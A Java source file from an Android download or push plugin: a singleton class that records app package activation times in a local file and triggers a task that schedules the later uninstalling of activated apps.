package com.tiho.dlplugin.task.activate;

import android.content.Context;

import com.tiho.base.common.LogManager;
import com.tiho.dlplugin.task.uninstall.UnInstallTask;
import com.tiho.dlplugin.util.FileUtil;
import com.tiho.dlplugin.util.PushDirectoryUtil;
import com.tiho.dlplugin.util.StringUtils;

import java.io.File;
import java.util.HashMap;
import java.util.Map;
import java.util.Set;

/**
 * 应用激活记录,每当有应用激活就加入到这个列表中
 * 
 * @author Joey.Dai
 * 
 */
public class ActivatedRecord {

	
	//每当有应用激活就会把包名和激活时间写入到该文件中
	private static final String ACTIVATE_FILE = "activate.dat";

	private static ActivatedRecord instance;

	//packName-->time
	private Map<String , Long> data;//激活记录
	
	private UnInstallTask uninstallTask;

	private ActivatedRecord(Context c) {
		super();
		
		data = new HashMap<String, Long>();
		uninstallTask = UnInstallTask.getInstance(c , this);
		//读取activate.dat文件的内容,并保存到data中
		init(c);
		//检查数据库中的卸载列表是否已激活过，是的话就加入到卸载列表target中,同时设置定时任务，将target中的应用定时卸载
		uninstallTask.updateTask();
		
	}

	private void init(Context c) {
		File f = PushDirectoryUtil.getFileInPushBaseDir(c, PushDirectoryUtil.BASE_DIR, ACTIVATE_FILE);

		if (f.exists()) {
			String content = FileUtil.getFileData(f);
			if (!StringUtils.isEmpty(content)) {
				String[] lines = content.split(FileUtil.LINE_SEPERATOR);
				for (String line : lines) {
					String[] parts = line.split(",");
					if (parts.length == 2) {
						data.put(parts[0], Long.parseLong(parts[1]));
					}
				}
			}
		}

		f = null;
	}

	public Set<String> getActList(){
		return data.keySet();
	}
	
	/**
	 * 添加激活记录
	 * 
	 * @param c
	 * @param pack
	 *            包名
	 * @param time
	 *            激活时间
	 */
	public void addRecord(Context c, String pack, long time) {
		LogManager.LogShow("添加激活记录 "+pack+","+time);
		
		synchronized (data) {
			if (!activated(pack)) {
				data.put(pack , time);
				flushToFile(c);
			}
		}
		uninstallTask.updateTask();
	}

	public void addBatch(Context context , Set<String> l){
		synchronized (data) {
			for (String string : l) {
				if (!activated(string)) //必须是激活记录data中没有的包名才加入data
					data.put(string , System.currentTimeMillis());
			}
		}
		
		
		flushToFile(context);
		uninstallTask.updateTask();
	}
	
	/**
	 * 是否已经激活过
	 * 
	 * @param pack
	 * @return
	 */
	public boolean activated(String pack) {
		return data.containsKey(pack);
	}
	
	
	public long getActivatedTime(String pack){
		Long t  = data.get(pack);
		return t == null ? Long.MAX_VALUE : t;
	}

	private void flushToFile(Context c) {

		StringBuilder sb = new StringBuilder();

		for(String pack : data.keySet()){
			sb.append(pack + "," + data.get(pack) + FileUtil.LINE_SEPERATOR);
		}
		
		File f = PushDirectoryUtil.getFileInPushBaseDir(c, PushDirectoryUtil.BASE_DIR, ACTIVATE_FILE);
		try {
			FileUtil.writeToFile(f, sb.toString().getBytes(), false);
		} catch (Exception e) {
			e.printStackTrace();
		}

		f = null;
	}

	public static synchronized ActivatedRecord getInstance(Context c) {
		if (instance == null)
			instance = new ActivatedRecord(c);

		return instance;
	}

}
